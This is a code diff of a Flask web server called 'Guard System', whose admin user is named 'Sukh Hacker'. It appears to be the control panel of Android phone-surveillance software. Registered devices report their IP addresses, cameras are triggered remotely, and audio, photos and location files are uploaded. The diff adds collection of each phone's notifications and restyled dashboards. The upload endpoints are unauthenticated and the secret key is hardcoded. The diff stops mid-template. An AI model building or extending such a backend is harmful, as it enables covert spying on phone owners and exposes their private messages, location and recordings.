@@ -2,29 +2,35 @@ import os
 import logging
 from flask import Flask, request, render_template_string, send_file, redirect, url_for, session, jsonify
 from werkzeug.utils import secure_filename
-from threading import Thread
+from threading import Thread, Lock
 import time
 import json
+from datetime import datetime
+import uuid
 
 # Initialize Flask app FIRST
 app = Flask(__name__)
 app.secret_key = 'your-secret-key-change-in-production-12345'
 app.config['UPLOAD_FOLDER'] = 'recordings'
 app.config['DEVICE_FOLDER'] = 'devices'
+app.config['NOTIFICATION_FOLDER'] = 'notifications'
 app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024  # 50MB limit
 
 # Ensure upload and device directories exist
 os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
+os.makedirs(app.config['NOTIFICATION_FOLDER'], exist_ok=True)
 
 # Global variable to track recording signal
 recording_signal = False
 signal_listeners = []
 camera_signal = {'active': False}
-location_signal = {'active': False}  # New location signal
+location_signal = {'active': False}
 
 # Device-specific signals storage
 device_signals = {}
+notifications = []
+notification_lock = Lock()
 
 # Simple authentication
 USERNAME = "Sukh Hacker"
@@ -61,7 +67,9 @@ def get_all_devices():
                     'name': device_data.get('name', 'Unknown Device'),
                     'model': device_data.get('model', 'Unknown Model'),
                     'last_seen': device_data.get('last_seen', 0),
-                    'status': device_data.get('status', 'offline')
+                    'status': device_data.get('status', 'offline'),
+                    'ip_address': device_data.get('ip_address', 'Unknown'),
+                    'android_version': device_data.get('android_version', 'Unknown')
                 })
     except FileNotFoundError:
         os.makedirs(app.config['DEVICE_FOLDER'], exist_ok=True)
@@ -69,6 +77,66 @@ def get_all_devices():
     # Sort by last seen (newest first)
     devices.sort(key=lambda x: x['last_seen'], reverse=True)
     return devices
+
+# Notification management
+def save_notification(device_id, notification_data):
+    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
+    notifications_list = []
+    
+    if os.path.exists(notification_file):
+        try:
+            with open(notification_file, 'r') as f:
+                notifications_list = json.load(f)
+        except:
+            notifications_list = []
+    
+    notification_data['id'] = str(uuid.uuid4())
+    notification_data['timestamp'] = time.time()
+    notification_data['read'] = False
+    
+    notifications_list.append(notification_data)
+    
+    # Keep only last 100 notifications
+    if len(notifications_list) > 100:
+        notifications_list = notifications_list[-100:]
+    
+    with open(notification_file, 'w') as f:
+        json.dump(notifications_list, f)
+    
+    return notification_data
+
+def get_notifications(device_id):
+    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
+    if os.path.exists(notification_file):
+        try:
+            with open(notification_file, 'r') as f:
+                notifications = json.load(f)
+                # Sort by timestamp (newest first)
+                notifications.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
+                return notifications
+        except:
+            return []
+    return []
+
+def mark_notification_read(device_id, notification_id):
+    notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
+    if os.path.exists(notification_file):
+        try:
+            with open(notification_file, 'r') as f:
+                notifications = json.load(f)
+            
+            for notification in notifications:
+                if notification.get('id') == notification_id:
+                    notification['read'] = True
+                    break
+            
+            with open(notification_file, 'w') as f:
+                json.dump(notifications, f)
+            
+            return True
+        except:
+            return False
+    return False
 
 # Device registration endpoint
 @app.route('/register-device', methods=['POST'])
@@ -78,6 +146,8 @@ def register_device():
         device_id = data.get('device_id')
         device_name = data.get('device_name', 'Unknown Device')
         device_model = data.get('device_model', 'Unknown Model')
+        android_version = data.get('android_version', 'Unknown')
+        ip_address = request.remote_addr
         
         if not device_id:
             return jsonify({'ok': False, 'error': 'Device ID required'}), 400
@@ -87,14 +157,17 @@ def register_device():
         device_data.update({
             'name': device_name,
             'model': device_model,
+            'android_version': android_version,
+            'ip_address': ip_address,
             'last_seen': time.time(),
-            'status': 'online'
+            'status': 'online',
+            'first_seen': device_data.get('first_seen', time.time())
         })
         
         # Save device data
         save_device_data(device_id, device_data)
         
-        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id}")
+        print(f"✅ Device registered: {device_name} ({device_model}) - ID: {device_id} - IP: {ip_address}")
         return jsonify({'ok': True, 'message': 'Device registered successfully'})
         
     except Exception as e:
@@ -107,6 +180,7 @@ def device_heartbeat():
     try:
         data = request.get_json()
         device_id = data.get('device_id')
+        ip_address = request.remote_addr
         
         if not device_id:
             return jsonify({'ok': False, 'error': 'Device ID required'}), 400
@@ -115,6 +189,7 @@ def device_heartbeat():
         device_data = load_device_data(device_id)
         device_data['last_seen'] = time.time()
         device_data['status'] = 'online'
+        device_data['ip_address'] = ip_address
         save_device_data(device_id, device_data)
         
         return jsonify({'ok': True})
@@ -122,6 +197,49 @@ def device_heartbeat():
     except Exception as e:
         print(f"❌ Device heartbeat error: {e}")
         return jsonify({'ok': False, 'error': 'Heartbeat failed'}), 500
+
+# Notification upload endpoint
+@app.route('/device/<device_id>/upload-notification', methods=['POST'])
+def upload_notification(device_id):
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'ok': False, 'error': 'No notification data'}), 400
+        
+        # Add device info to notification
+        data['device_id'] = device_id
+        data['device_name'] = load_device_data(device_id).get('name', 'Unknown Device')
+        
+        # Save notification
+        saved_notification = save_notification(device_id, data)
+        
+        print(f"📢 Notification received from {device_id}: {data.get('title', 'No Title')}")
+        return jsonify({'ok': True, 'message': 'Notification saved', 'notification_id': saved_notification['id']})
+        
+    except Exception as e:
+        print(f"❌ Notification upload error: {e}")
+        return jsonify({'ok': False, 'error': 'Notification save failed'}), 500
+
+# Get notifications endpoint
+@app.route('/device/<device_id>/notifications')
+def get_device_notifications(device_id):
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    notifications_list = get_notifications(device_id)
+    return jsonify({'ok': True, 'notifications': notifications_list})
+
+# Mark notification as read
+@app.route('/device/<device_id>/notifications/<notification_id>/read', methods=['POST'])
+def mark_notification_as_read(device_id, notification_id):
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    success = mark_notification_read(device_id, notification_id)
+    if success:
+        return jsonify({'ok': True, 'message': 'Notification marked as read'})
+    else:
+        return jsonify({'ok': False, 'error': 'Notification not found'}), 404
 
 # Login route
 @app.route('/login', methods=['GET', 'POST'])
@@ -181,7 +299,8 @@ def device_dashboard(device_id):
                 file_info = {
                     'name': filename,
                     'size': os.path.getsize(filepath),
-                    'modified': os.path.getmtime(filepath)
+                    'modified': os.path.getmtime(filepath),
+                    'url': f"/files/{filename}"
                 }
                 
                 if filename.endswith(('.m4a', '.mp3', '.wav', '.mp4')):
@@ -194,6 +313,9 @@ def device_dashboard(device_id):
     except FileNotFoundError:
         os.makedirs(upload_dir, exist_ok=True)
     
+    # Get notifications for this device
+    notifications_list = get_notifications(device_id)
+    
     # Sort by modification time (newest first)
     files.sort(key=lambda x: x['modified'], reverse=True)
     photos.sort(key=lambda x: x['modified'], reverse=True)
@@ -203,8 +325,9 @@ def device_dashboard(device_id):
                                  device=device_data, 
                                  device_id=device_id,
                                  files=files, 
-                                 photos=photos[:6],
-                                 location_files=location_files[:5])
+                                 photos=photos[:12],
+                                 location_files=location_files[:10],
+                                 notifications=notifications_list[:20])
 
 # Device-specific camera routes
 @app.route('/device/<device_id>/start-camera-signal', methods=['POST'])
@@ -216,12 +339,13 @@ def start_device_camera_signal(device_id):
     camera_type = data.get('camera_type', 'front')
     
     # Store device-specific camera signal
-    device_signals[device_id] = {
-        'camera': {
-            'active': True,
-            'camera_type': camera_type,
-            'timestamp': time.time()
-        }
+    if device_id not in device_signals:
+        device_signals[device_id] = {}
+    
+    device_signals[device_id]['camera'] = {
+        'active': True,
+        'camera_type': camera_type,
+        'timestamp': time.time()
     }
     
     print(f"Camera signal activated for device {device_id} - {camera_type} camera")
@@ -422,7 +546,8 @@ def mobile_device_upload(device_id):
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         audio_file.save(filepath)
         
-        print(f"✅ Mobile recording uploaded for device {device_id}: {filename} ({os.path.getsize(filepath)} bytes)")
+        file_size = os.path.getsize(filepath)
+        print(f"✅ Mobile recording uploaded for device {device_id}: {filename} ({file_size} bytes)")
         return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
     
     except Exception as e:
@@ -451,7 +576,7 @@ def get_device_latest_photos(device_id):
         pass
     
     photos.sort(key=lambda x: x['modified'], reverse=True)
-    return jsonify({'ok': True, 'photos': photos[:6]})
+    return jsonify({'ok': True, 'photos': photos[:12]})
 
 # Get device-specific location files API
 @app.route('/device/<device_id>/get-location-files')
@@ -475,7 +600,7 @@ def get_device_location_files(device_id):
         pass
     
     location_files.sort(key=lambda x: x['modified'], reverse=True)
-    return jsonify({'ok': True, 'locations': location_files[:5]})
+    return jsonify({'ok': True, 'locations': location_files[:10]})
 
 # ✅ LEGACY ROUTES FOR EXISTING ANDROID APP COMPATIBILITY
 
@@ -650,6 +775,9 @@ def mobile_upload_legacy():
     try:
         print("📱 Legacy mobile upload received")
         
+        # Try to get device ID from various sources
+        device_id = "unknown_device"
+        
         audio_file = None
         if 'file' in request.files:
             audio_file = request.files['file']
@@ -665,7 +793,8 @@ def mobile_upload_legacy():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         audio_file.save(filepath)
         
-        print(f"✅ Legacy recording uploaded: {filename}")
+        file_size = os.path.getsize(filepath)
+        print(f"✅ Legacy recording uploaded: {filename} ({file_size} bytes)")
         return jsonify({'ok': True, 'message': 'Upload successful', 'filename': filename})
     
     except Exception as e:
@@ -691,7 +820,8 @@ def mobile_upload_photo_legacy():
         filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
         photo_file.save(filepath)
         
-        print(f"✅ Legacy photo uploaded: {filename}")
+        file_size = os.path.getsize(filepath)
+        print(f"✅ Legacy photo uploaded: {filename} ({file_size} bytes)")
         return jsonify({'ok': True, 'message': 'Photo uploaded', 'filename': filename})
     
     return jsonify({'ok': False, 'error': 'Upload failed'}), 500
@@ -771,6 +901,21 @@ def delete_file(filename):
     except Exception as e:
         return jsonify({'ok': False, 'error': str(e)}), 500
 
+# Clear all notifications for device
+@app.route('/device/<device_id>/clear-notifications', methods=['POST'])
+def clear_notifications(device_id):
+    if not session.get('logged_in'):
+        return jsonify({'ok': False, 'error': 'unauthorized'}), 401
+    
+    try:
+        notification_file = os.path.join(app.config['NOTIFICATION_FOLDER'], f"{device_id}_notifications.json")
+        if os.path.exists(notification_file):
+            os.remove(notification_file)
+        
+        return jsonify({'ok': True, 'message': 'All notifications cleared'})
+    except Exception as e:
+        return jsonify({'ok': False, 'error': str(e)}), 500
+
 # Debug route to check devices
 @app.route('/debug-devices')
 def debug_devices():
@@ -780,38 +925,243 @@ def debug_devices():
         'devices': devices
     })
 
-# DEVICES_HTML template - Shows list of all connected devices
+# Debug route to check uploads
+@app.route('/debug-uploads')
+def debug_uploads():
+    """Debug route to check uploaded files"""
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    
+    upload_dir = app.config['UPLOAD_FOLDER']
+    files = []
+    
+    try:
+        for filename in os.listdir(upload_dir):
+            filepath = os.path.join(upload_dir, filename)
+            files.append({
+                'name': filename,
+                'size': os.path.getsize(filepath),
+                'modified': time.ctime(os.path.getmtime(filepath)),
+                'path': filepath
+            })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+    
+    # Sort by modification time
+    files.sort(key=lambda x: os.path.getmtime(x['path']), reverse=True)
+    
+    return jsonify({
+        'upload_folder': upload_dir,
+        'total_files': len(files),
+        'files': files
+    })
+
+# HTML TEMPLATES - MODERN AND RESPONSIVE
+
+LOGIN_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 Guard System - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: #666;
+            font-size: 1rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.8);
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            border-radius: 12px;
+            color: #333;
+            padding: 15px 20px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.3);
+            background: white;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .error-message {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
+            color: white;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 500;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 20px;
+            }
+            
+            .login-header h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>🚀 GUARD SYSTEM</h1>
+            <p>Secure Access Portal</p>
+        </div>
+        
+        <form method="POST">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required autocomplete="off">
+            </div>
+            
+            <button type="submit" class="login-btn">🔐 Login to Dashboard</button>
+            
+            {% if error %}
+            <div class="error-message">{{ error }}</div>
+            {% endif %}
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+# Continue with DEVICES_HTML and DEVICE_DASHBOARD_HTML in next message due to length...
+# MODERN DEVICES_HTML TEMPLATE
 DEVICES_HTML = """
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🚀 Guard System - Devices</title>
     <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --dark: #1f2937;
+            --darker: #111827;
+            --light: #f9fafb;
+            --gray: #6b7280;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
-            color: #ffffff;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--light);
             min-height: 100vh;
             overflow-x: hidden;
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
             padding: 20px;
         }
         
         /* Header Styles */
         header {
-            background: rgba(25, 25, 25, 0.95);
+            background: rgba(31, 41, 55, 0.8);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
@@ -820,20 +1170,22 @@ DEVICES_HTML = """
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
         }
         
         .header-left h1 {
-            color: #00b7ff;
-            font-size: 2.2rem;
-            font-weight: 700;
-            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.5rem;
+            font-weight: 800;
             margin-bottom: 5px;
         }
         
         .header-left p {
-            color: #888;
-            font-size: 1rem;
+            color: var(--gray);
+            font-size: 1.1rem;
         }
         
         .header-right {
@@ -860,25 +1212,66 @@ DEVICES_HTML = """
         }
         
         .btn-logout {
-            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
+            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
             color: white;
         }
         
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.4);
+        }
+        
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(31, 41, 55, 0.8);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 25px;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 15px 30px rgba(99, 102, 241, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         /* Devices Grid */
         .devices-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
             gap: 25px;
             margin-top: 20px;
         }
         
         .device-card {
-            background: rgba(25, 25, 25, 0.95);
+            background: rgba(31, 41, 55, 0.8);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
@@ -889,48 +1282,46 @@ DEVICES_HTML = """
             overflow: hidden;
         }
         
+        .device-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+        }
+        
+        .device-card.online {
+            border-left: 4px solid var(--secondary);
+        }
+        
+        .device-card.offline {
+            border-left: 4px solid var(--gray);
+        }
+        
         .device-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 183, 255, 0.3);
-            border-color: #00b7ff;
-        }
-        
-        .device-card.online::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 5px;
-            height: 100%;
-            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
-        }
-        
-        .device-card.offline::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 5px;
-            height: 100%;
-            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            border-color: var(--primary);
         }
         
         .device-header {
             display: flex;
             justify-content: space-between;
             align-items: flex-start;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         
         .device-name {
-            color: #00b7ff;
+            color: var(--light);
             font-size: 1.4rem;
             font-weight: 700;
             margin-bottom: 5px;
         }
         
         .device-model {
-            color: #888;
+            color: var(--gray);
             font-size: 0.9rem;
         }
         
@@ -944,12 +1335,14 @@ DEVICES_HTML = """
         }
         
         .status-online {
-            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
-            box-shadow: 0 0 15px rgba(40, 167, 69, 0.5);
+            background: linear-gradient(135deg, var(--secondary) 0%, #059669 100%);
+            color: white;
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
         }
         
         .status-offline {
-            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
+            background: linear-gradient(135deg, var(--gray) 0%, #4b5563 100%);
+            color: white;
         }
         
         .device-info {
@@ -959,16 +1352,19 @@ DEVICES_HTML = """
         .device-info-item {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-size: 0.9rem;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
         
         .info-label {
-            color: #888;
+            color: var(--gray);
         }
         
         .info-value {
-            color: #ccc;
+            color: var(--light);
+            font-weight: 500;
         }
         
         .device-actions {
@@ -979,7 +1375,7 @@ DEVICES_HTML = """
         
         .btn-control {
             flex: 1;
-            padding: 10px;
+            padding: 12px;
             border: none;
             border-radius: 10px;
             font-size: 0.85rem;
@@ -992,37 +1388,79 @@ DEVICES_HTML = """
         }
         
         .btn-manage {
-            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
         }
         
         .empty-state {
             grid-column: 1 / -1;
             text-align: center;
-            padding: 60px 20px;
-            color: #666;
+            padding: 80px 20px;
+            color: var(--gray);
         }
         
         .empty-state h3 {
-            font-size: 1.5rem;
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: var(--light);
+        }
+        
+        .empty-state p {
+            font-size: 1.1rem;
             margin-bottom: 10px;
-            color: #888;
         }
         
         .refresh-btn {
-            background: rgba(108, 117, 125, 0.3);
-            color: #ccc;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 10px 20px;
+            background: rgba(99, 102, 241, 0.2);
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            padding: 12px 25px;
             border-radius: 10px;
             cursor: pointer;
             font-size: 0.9rem;
+            font-weight: 600;
             margin-top: 20px;
             transition: all 0.3s ease;
         }
         
         .refresh-btn:hover {
-            background: rgba(108, 117, 125, 0.5);
+            background: var(--primary);
+            color: white;
             transform: translateY(-2px);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .header-left h1 {
+                font-size: 2rem;
+            }
+            
+            .devices-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .device-card {
+                padding: 20px;
+            }
         }
     </style>
 </head>
@@ -1032,18 +1470,38 @@ DEVICES_HTML = """
         <header>
             <div class="header-left">
                 <h1>🚀 GUARD SYSTEM</h1>
-                <p>Connected Devices Management</p>
+                <p>Connected Devices Management Dashboard</p>
             </div>
             <div class="header-right">
                 <a href="/logout" class="btn btn-logout">🚪 Logout</a>
             </div>
         </header>
 
+        <!-- Stats Section -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number">{{ devices|length }}</div>
+                <div class="stat-label">Total Devices</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ devices|selectattr('status', 'equalto', 'online')|list|length }}</div>
+                <div class="stat-label">Online Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{{ devices|selectattr('status', 'equalto', 'offline')|list|length }}</div>
+                <div class="stat-label">Offline</div>
+            </div>
+        </div>
+
         <!-- Devices Section -->
         <div class="control-section">
-            <div class="section-title">
-                📱 Connected Devices
-                <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Devices</button>
+            <div class="section-title" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">
+                <h2 style="color: var(--light); font-size: 1.8rem; font-weight: 700;">
+                    📱 Connected Devices
+                </h2>
+                <button class="refresh-btn" onclick="refreshDevices()">
+                    🔄 Refresh Devices
+                </button>
             </div>
             
             <div class="devices-grid" id="devicesGrid">
@@ -1062,16 +1520,28 @@ DEVICES_HTML = """
                     <div class="device-info">
                         <div class="device-info-item">
                             <span class="info-label">Device ID:</span>
-                            <span class="info-value">{{ device.id[:8] }}...</span>
+                            <span class="info-value">{{ device.id[:12] }}...</span>
+                        </div>
+                        <div class="device-info-item">
+                            <span class="info-label">Android Version:</span>
+                            <span class="info-value">{{ device.android_version }}</span>
+                        </div>
+                        <div class="device-info-item">
+                            <span class="info-label">IP Address:</span>
+                            <span class="info-value">{{ device.ip_address }}</span>
                         </div>
                         <div class="device-info-item">
                             <span class="info-label">Last Seen:</span>
-                            <span class="info-value" id="lastSeen{{ device.id }}">{{ device.last_seen|int|string|truncate(10, True, '') }}</span>
+                            <span class="info-value" id="lastSeen{{ device.id }}">
+                                {{ device.last_seen|int|string|truncate(10, True, '') }}
+                            </span>
                         </div>
                     </div>
                     
                     <div class="device-actions">
-                        <a href="/device/{{ device.id }}" class="btn-control btn-manage">🎮 Manage Device</a>
+                        <a href="/device/{{ device.id }}" class="btn-control btn-manage">
+                            🎮 Manage Device
+                        </a>
                     </div>
                 </div>
                 {% endfor %}
@@ -1081,6 +1551,9 @@ DEVICES_HTML = """
                     <h3>📱 No Devices Connected</h3>
                     <p>Install the Guard System app on your Android devices to see them here.</p>
                     <p>Devices will automatically appear when they connect to the server.</p>
+                    <button class="refresh-btn" onclick="refreshDevices()">
+                        🔄 Check Again
+                    </button>
                 </div>
                 {% endif %}
             </div>
@@ -1092,51 +1565,64 @@ DEVICES_HTML = """
             location.reload();
         }
         
-        // Format last seen timestamps
-        document.addEventListener('DOMContentLoaded', function() {
-            // This would typically format the timestamps to relative time
-            // For now, we'll just reload the page to get fresh data
-        });
-        
         // Auto-refresh every 30 seconds
         setInterval(refreshDevices, 30000);
+        
+        // Format timestamps
+        document.addEventListener('DOMContentLoaded', function() {
+            // Timestamp formatting logic yahan add kar sakte hain
+        });
     </script>
 </body>
 </html>
 """
 
-# DEVICE_DASHBOARD_HTML template - Individual device control panel
+# MODERN DEVICE_DASHBOARD_HTML TEMPLATE
 DEVICE_DASHBOARD_HTML = """
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>🚀 Guard System - {{ device.name }}</title>
     <style>
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --warning: #f59e0b;
+            --info: #3b82f6;
+            --dark: #1f2937;
+            --darker: #111827;
+            --light: #f9fafb;
+            --gray: #6b7280;
+            --success: #10b981;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
-            color: #ffffff;
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--light);
             min-height: 100vh;
             overflow-x: hidden;
         }
         
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
             padding: 20px;
         }
         
         /* Header Styles */
         header {
-            background: rgba(25, 25, 25, 0.95);
+            background: rgba(31, 41, 55, 0.8);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
@@ -1145,26 +1631,37 @@ DEVICE_DASHBOARD_HTML = """
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
         }
         
         .header-left h1 {
-            color: #00b7ff;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
             font-size: 2.2rem;
-            font-weight: 700;
-            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
+            font-weight: 800;
             margin-bottom: 5px;
         }
         
         .header-left p {
-            color: #888;
+            color: var(--gray);
             font-size: 1rem;
         }
         
         .device-info {
             margin-top: 10px;
             font-size: 0.9rem;
-            color: #ccc;
+            color: var(--gray);
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .device-info-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
         
         .header-right {
@@ -1191,45 +1688,40 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .btn-logout {
-            background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%);
